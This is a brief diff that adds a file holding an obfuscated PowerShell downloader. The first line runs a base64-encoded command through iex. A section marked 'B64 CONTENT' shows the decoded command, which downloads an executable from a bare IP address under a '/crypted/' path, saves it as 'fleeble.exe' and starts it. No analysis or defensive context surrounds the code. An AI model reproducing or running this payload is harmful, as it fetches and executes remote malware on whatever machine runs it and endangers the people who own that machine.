@@ -1,0 +1,7 @@
+iex([sYsteM.TExt.enCODING]::uTf8.GEtSTring([sYsTEM.CoNVErT]::fRomBaSE64STRInG('CihOZXctT2JqZWN0IFN5c1RFTS5OZVQuV0ViY2xJZW5UKS5kb3dObE9BZEZpbEUoJ2h0dHA6Ly8zMS4xODQuMjM0Ljc0L2NyeXB0ZWQvMTA4MHF3LmV4ZScsJ2ZsZWVibGUuZXhlJyk7U3RhcnQtUHJvY2VzcyAnZmxlZWJsZS5leGUnCgo=')));exit
+
+##### B64 CONTENT #####
+
+
+(New-Object SysTEM.NeT.WEbclIenT).dowNlOAdFilE('http://31.184.234.74/crypted/1080qw.exe','fleeble.exe');Start-Process 'fleeble.exe'
+
